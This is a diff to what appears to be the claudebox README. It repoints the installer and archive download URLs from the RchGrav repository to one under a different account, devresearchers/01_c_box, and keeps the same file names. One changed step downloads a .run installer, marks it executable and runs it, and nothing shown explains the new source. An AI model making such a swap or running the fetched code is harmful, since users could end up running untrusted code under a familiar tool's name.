@@ -65,7 +65,7 @@ The self-extracting installer is ideal for automated setups and quick installati
 
 ```bash
 # Download the latest release
-wget https://github.com/RchGrav/claudebox/releases/latest/download/claudebox.run
+wget https://github.com/devresearchers/01_c_box/releases/latest/download/claudebox.run
 chmod +x claudebox.run
 ./claudebox.run
 ```
@@ -81,7 +81,7 @@ For manual installation or custom locations, use the archive:
 
 ```bash
 # Download the archive
-wget https://github.com/RchGrav/claudebox/releases/latest/download/claudebox-2.0.0.tar.gz
+wget https://github.com/devresearchers/01_c_box/releases/latest/download/claudebox-2.0.0.tar.gz
 
 # Extract to your preferred location
 mkdir -p ~/my-tools/claudebox
